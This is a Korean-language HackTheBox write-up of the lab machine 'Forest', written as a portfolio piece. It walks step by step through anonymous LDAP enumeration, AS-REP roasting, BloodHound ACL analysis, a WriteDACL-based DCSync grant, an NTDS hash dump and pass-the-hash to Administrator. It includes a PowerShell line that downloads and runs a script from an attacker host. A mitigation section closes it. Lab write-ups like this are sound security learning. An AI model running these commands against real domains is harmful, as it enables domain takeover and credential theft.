# HackTheBox 라이트업 - Forest

> Active Directory / Anonymous LDAP / AS-REP Roasting / BloodHound / WriteDACL / DCSync

---

## 1. 개요

HTB Forest는 도메인 컨트롤러가 직접 노출된 Active Directory 머신이다. 정찰 단계에서 DNS, Kerberos, LDAP, SMB, Global Catalog, WinRM이 함께 열려 있어 AD 환경임을 확인할 수 있었다.

공격 흐름은 익명 LDAP/SMB 열거로 사용자 목록을 확보하고, Kerberos 사전 인증이 꺼진 계정을 대상으로 AS-REP Roasting을 수행한 뒤, BloodHound로 ACL 기반 권한 경로를 분석하는 방식이었다. 최종적으로 `GenericAll`과 `WriteDACL` 경로를 이용해 DCSync 권한을 부여하고 도메인 계정 해시를 덤프했다.

이 문제에서 가장 많이 배운 점은 BloodHound 그래프를 “결과 화면”으로만 보는 것이 아니라, 각 edge가 실제 어떤 PowerShell 명령과 권한 변경으로 이어지는지 해석해야 한다는 점이었다.

민감한 IP, 비밀번호, 해시, flag는 포트폴리오용으로 익명화했다.

---

## 2. 대상 / 환경

| 항목 | 내용 |
| --- | --- |
| 머신 | HackTheBox Forest |
| OS | Windows Server 2016 |
| 도메인 | `htb.local` |
| 호스트명 | `FOREST.htb.local` |
| 주요 서비스 | DNS, Kerberos, LDAP, SMB, WinRM |
| 핵심 흐름 | Anonymous LDAP -> AS-REP Roasting -> WriteDACL -> DCSync |

---

## 3. 공격 경로 요약

```text
Nmap 스캔으로 도메인 컨트롤러 식별
-> SMB/LDAP 익명 접근 가능성 확인
-> LDAP null session으로 사용자 목록 수집
-> AS-REP Roasting 대상 확인
-> svc-alfresco AS-REP 해시 획득
-> hashcat으로 비밀번호 크랙
-> Evil-WinRM으로 초기 shell 획득
-> BloodHound로 ACL 경로 분석
-> svc-alfresco를 Exchange Windows Permissions 그룹에 추가
-> WriteDACL로 DCSync 권한 부여
-> secretsdump/netexec로 NTDS 해시 덤프
-> Administrator Pass-the-Hash
```

---

## 4. 정찰

### 4.1 Nmap

```bash
nmap -Pn -n -sC -sV -p- --min-rate 5000 IP -oA forest_full
```

주요 포트:

| 포트 | 서비스 | 분석 |
| --- | --- | --- |
| 53 | DNS | 도메인 컨트롤러 가능성 |
| 88 | Kerberos | AS-REP Roasting / Kerberoasting 확인 |
| 135/593 | RPC | Windows AD 관리 인터페이스 |
| 139/445 | SMB | null session, 공유, OS 정보 |
| 389/636 | LDAP/LDAPS | 사용자, 그룹, 정책 열거 |
| 3268/3269 | Global Catalog | AD 포리스트 검색 |
| 5985 | WinRM | 계정 획득 후 PowerShell 접근 가능성 |

SMB 스크립트 결과에서 `FOREST`, `htb.local`, `FOREST.htb.local` 정보를 확인했다. SMB signing은 required였기 때문에 relay보다는 사용자 열거와 Kerberos 기반 공격에 초점을 맞췄다.

---

## 5. 익명 LDAP / SMB 열거

스캔 결과에서 `account_used: <blank>`가 보였고, 익명 접근 가능성을 확인했다. AD에서는 사용자 이름만 확보해도 AS-REP Roasting, Password Spray, Kerberoasting 등으로 이어질 수 있으므로 사용자 목록 수집을 먼저 진행했다.

```bash
netexec ldap IP -u '' -p '' --users | tee users_raw.txt
cat users_raw.txt | tr -s ' ' | cut -d ' ' -f 5 | sort -u > users.txt
```

대체 방법:

```bash
ldapsearch -x -H ldap://IP -b "DC=htb,DC=local" \
  "(&(objectClass=user))" sAMAccountName
```

주요 계정 후보:

```text
svc-alfresco
andy
mark
santi
```

![익명 LDAP 사용자 열거](assets/reports/htb-forest/01-anonymous-ldap-users.png)

이 단계는 단순 정보 수집이 아니라 공격 경로의 시작점이었다. 사용자 목록이 있어야 Kerberos 기반 공격과 BloodHound 수집으로 이어질 수 있기 때문이다.

---

## 6. AS-REP Roasting

사용자 목록을 확보한 뒤, Kerberos 사전 인증이 꺼진 계정이 있는지 확인했다.

```bash
impacket-GetNPUsers htb.local/ -usersfile users.txt \
  -outputfile asreproast.hash -dc-ip IP
```

결과:

```text
$krb5asrep$23$svc-alfresco@HTB.LOCAL:...
```

hashcat 18200 모드로 크랙했다.

```bash
hashcat -m 18200 -a 0 asreproast.hash /usr/share/wordlists/rockyou.txt
```

결과:

```text
svc-alfresco:CRACKED_PASSWORD
```

![AS-REP 해시 크랙 결과](assets/reports/htb-forest/02-asrep-crack-redacted.png)

AS-REP Roasting은 사전 인증이 꺼진 계정이 있을 때 비밀번호 없이도 오프라인 크랙 가능한 해시를 얻는 공격이다. Forest에서는 이 한 설정 실수가 초기 인증 획득으로 이어졌다.

---

## 7. 초기 접근

크랙한 계정이 SMB와 WinRM에서 유효한지 확인했다.

```bash
netexec smb IP -u svc-alfresco -p 'CRACKED_PASSWORD'
evil-winrm -i IP -u svc-alfresco -p 'CRACKED_PASSWORD'
```

WinRM이 열려 있었기 때문에 PowerShell 세션을 획득할 수 있었다. 하지만 이 계정은 바로 Domain Admin이 아니었고, BloodHound를 통한 권한 경로 분석이 필요했다.

---

## 8. BloodHound 수집과 경로 분석

Linux에서 BloodHound 수집을 수행했다.

```bash
bloodhound-python -u svc-alfresco -p 'CRACKED_PASSWORD' -d htb.local \
  -c All -dc forest.htb.local -ns IP --zip
```

발견한 주요 경로:

```text
SVC-ALFRESCO@HTB.LOCAL
-> MemberOf: ACCOUNT OPERATORS

ACCOUNT OPERATORS
-> GenericAll: EXCHANGE WINDOWS PERMISSIONS

EXCHANGE WINDOWS PERMISSIONS
-> WriteDACL: HTB.LOCAL domain object
```

권한 해석:

```text
GenericAll
-> 대상 그룹/객체에 대해 광범위한 제어 가능

WriteDACL
-> 대상 객체의 ACL 수정 가능

DCSync
-> 도메인 복제 권한을 부여하면 NTDS 해시 덤프 가능
```

![BloodHound WriteDACL 경로](assets/reports/htb-forest/03-bloodhound-writedacl-path.png)

이 경로는 `svc-alfresco`가 직접 Domain Admin은 아니지만, 그룹 멤버십과 ACL 조작을 통해 DCSync 권한을 자기 자신에게 부여할 수 있음을 보여준다.

---

## 9. PowerView 로드

Evil-WinRM 세션에서 PowerView를 로드했다.

```powershell
iex (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:PORT/PowerView.ps1')
```

또는 파일을 업로드한 뒤 dot sourcing으로 로드할 수 있다.

```powershell
upload PowerView.ps1
. .\PowerView.ps1
```

PowerView는 AD 그룹 멤버십 변경, ACL 조회/수정, 권한 경로 검증에 사용했다.

---

## 10. Exchange Windows Permissions 그룹 추가

BloodHound 경로에 따라 `svc-alfresco`를 `Exchange Windows Permissions` 그룹에 추가했다.

```powershell
Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco
```

의미:

```text
svc-alfresco가 Account Operators 권한을 통해
Exchange Windows Permissions 그룹에 자기 자신을 추가
-> 해당 그룹은 도메인 객체에 WriteDACL 보유
-> svc-alfresco가 도메인 ACL 수정 가능 상태가 됨
```

---

## 11. WriteDACL로 DCSync 권한 부여

인증 객체를 생성한 뒤, 도메인 객체에 DCSync 권한을 부여했다.

```powershell
$pass = ConvertTo-SecureString 'CRACKED_PASSWORD' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('htb\svc-alfresco', $pass)

Add-DomainObjectAcl -Credential $cred `
  -PrincipalIdentity svc-alfresco `
  -TargetIdentity 'DC=htb,DC=local' `
  -Rights DCSync
```

DCSync는 도메인 컨트롤러의 복제 권한을 흉내 내 계정 해시를 요청하는 공격이다. Domain Admin shell이 없어도 복제 권한만 있으면 도메인 전체 계정 해시 덤프로 이어질 수 있다.

---

## 12. NTDS 해시 덤프

DCSync 권한을 부여한 뒤 `secretsdump` 또는 `netexec --ntds`로 해시를 덤프했다.

```bash
impacket-secretsdump htb.local/svc-alfresco:'CRACKED_PASSWORD'@IP
```

또는:

```bash
netexec smb IP -u svc-alfresco -p 'CRACKED_PASSWORD' --ntds
```

결과에서 Administrator NTLM 해시를 확인했다.

```text
Administrator:500:<lm_hash>:<ntlm_hash>:::
```

---

## 13. Pass-the-Hash

Administrator 해시로 WinRM 인증을 수행했다.

```bash
netexec smb IP -u administrator -H ADMINISTRATOR_NTLM_HASH
evil-winrm -i IP -u administrator -H ADMINISTRATOR_NTLM_HASH
```

권한 확인:

```powershell
whoami
hostname
```

![관리자 WinRM 접근 확인](assets/reports/htb-forest/04-admin-winrm-redacted.png)

포트폴리오에는 관리자 해시와 flag를 공개하지 않고, 권한 상승이 실제로 이어졌다는 흐름만 보여준다.

---

## 14. 영향도

| 구분 | 내용 |
| --- | --- |
| 초기 정보 노출 | 익명 LDAP/SMB로 도메인 사용자 목록 수집 가능 |
| 초기 침투 | AS-REP Roasting으로 서비스 계정 비밀번호 크랙 |
| 권한 상승 | GenericAll + WriteDACL 경로로 DCSync 권한 획득 |
| 최종 영향 | Administrator NTLM 해시 획득 및 도메인 장악 |
| 파급 범위 | 도메인 내 계정 해시 복제 가능 |

---

## 15. 대응 방안

- LDAP/SMB 익명 열거를 차단하고 null session 정책을 점검한다.
- 모든 계정에서 `Do not require Kerberos preauthentication` 설정을 비활성화한다.
- 서비스 계정에는 긴 무작위 비밀번호 또는 gMSA를 적용한다.
- Kerberos 이벤트 ID 4768에서 사전 인증 없는 TGT 요청을 모니터링한다.
- Account Operators, Exchange Windows Permissions 같은 고위험 그룹 멤버십을 정기 감사한다.
- BloodHound로 `GenericAll`, `WriteDACL`, `DCSync` 경로를 주기적으로 점검한다.
- Directory Service Access 이벤트 ID 4662와 복제 권한 사용 이벤트를 모니터링한다.

---

## 16. 학습한 점

- AD에서는 사용자 이름만 확보해도 Kerberos 기반 공격으로 이어질 수 있다.
- Nmap에서 Kerberos/LDAP/SMB/GC/WinRM이 함께 보이면 도메인 컨트롤러 관점으로 해석해야 한다.
- AS-REP Roasting은 단일 계정 설정 실수가 초기 침투로 이어지는 대표적인 AD 취약점이다.
- BloodHound edge는 그래프가 아니라 실제 권한 행위로 해석해야 한다.
- DCSync는 관리자 로그인 없이도 복제 권한만으로 도메인 전체 계정 해시 덤프로 이어질 수 있다.
- Forest는 명령어 하나보다 “사용자 열거 -> Kerberos 공격 -> BloodHound 분석 -> ACL 조작”을 순서대로 이해하는 것이 핵심이었다.
